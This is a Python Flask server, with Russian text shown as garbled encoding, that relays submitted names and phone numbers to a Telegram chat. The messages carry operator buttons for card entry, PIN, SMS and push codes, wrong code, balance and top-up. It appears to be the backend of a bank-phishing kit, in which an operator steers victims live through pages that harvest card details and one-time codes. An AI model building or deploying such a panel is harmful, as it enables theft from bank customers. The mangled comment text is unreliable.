import os
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS
from flask_socketio import SocketIO

# ‚úÖ –°–æ–∑–¥–∞—ë–º Flask-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ
app = Flask(__name__)
CORS(app)

# ‚úÖ WebSocket
socketio = SocketIO(app, cors_allowed_origins="*")

# ‚úÖ –ü–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

if not TELEGRAM_BOT_TOKEN or not CHAT_ID:
    raise ValueError("‚ùå –û—à–∏–±–∫–∞: TELEGRAM_BOT_TOKEN –∏–ª–∏ CHAT_ID –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã!")

print(f"‚úÖ –ó–∞–≥—Ä—É–∂–µ–Ω TELEGRAM_BOT_TOKEN: {TELEGRAM_BOT_TOKEN[:5]}...")
print(f"‚úÖ –ó–∞–≥—Ä—É–∂–µ–Ω CHAT_ID: {CHAT_ID}")

# ‚úÖ –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram
@app.route("/send-to-telegram", methods=["POST"])
def send_to_telegram():
    try:
        data = request.json
        print(f"üì© –ü–æ–ª—É—á–µ–Ω—ã –¥–∞–Ω–Ω—ã–µ: {data}")

        message_text = f"üì© –ù–æ–≤—ã–π –∑–∞–ø—Ä–æ—Å:\n\n–ò–º—è: {data['name']}\n–¢–µ–ª–µ—Ñ–æ–Ω: {data['phone']}\n–ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π: {data['comment']}"

        # üìå –ö–Ω–æ–ø–∫–∏ –º–µ–Ω—é
        keyboard = {
            "inline_keyboard": [
                [{"text": "SMS", "callback_data": "redirect_sms"},
                 {"text": "–ü—É—à", "callback_data": "push"},
                 {"text": "–í–≤–æ–¥ –∫–∞—Ä—Ç—ã", "callback_data": "card"},
                 {"text": "PIN", "callback_data": "pin"}],
                [{"text": "–õ–∏–º–∏—Ç—ã", "callback_data": "limits"},
                 {"text": "–ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥", "callback_data": "wrong_code"},
                 {"text": "–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞", "callback_data": "phone_number"}],
                [{"text": "–°–≤–æ–π —Ç–µ–∫—Å—Ç/—Ñ–æ—Ç–æ", "callback_data": "custom_text"}],
                [{"text": "–ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ", "callback_data": "topup"},
                 {"text": "–ë–∞–ª–∞–Ω—Å", "callback_data": "balance"}],
                [{"text": "‚úÖ –£—Å–ø–µ—Ö", "callback_data": "success"},
                 {"text": "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –õ–ö", "callback_data": "wrong_lk"}]
            ]
        }

        # üì© –ó–∞–ø—Ä–æ—Å –≤ Telegram
        payload = {
            "chat_id": CHAT_ID,
            "text": message_text,
            "reply_markup": keyboard
        }

        response = requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", json=payload)

        print(f"üì© –û—Ç–≤–µ—Ç –æ—Ç Telegram: {response.status_code}, {response.text}")

        if response.status_code == 200:
            return jsonify({"success": True, "message": "‚úÖ –î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã!"}), 200
        else:
            return jsonify({"success": False, "error": response.text}), response.status_code

    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞: {e}")
        return jsonify({"success": False, "error": str(e)}), 500


# ‚úÖ WebSocket –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏
@socketio.on("connect")
def handle_connect():
    print("‚úÖ WebSocket –ø–æ–¥–∫–ª—é—á–µ–Ω!")


@socketio.on("disconnect")
def handle_disconnect():
    print("‚ùå WebSocket –æ—Ç–∫–ª—é—á–µ–Ω!")


# ‚úÖ –ó–∞–ø—É—Å–∫ —Å–µ—Ä–≤–µ—Ä–∞
if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=int(os.getenv("PORT", 5000)), debug=False, allow_unsafe_werkzeug=True)

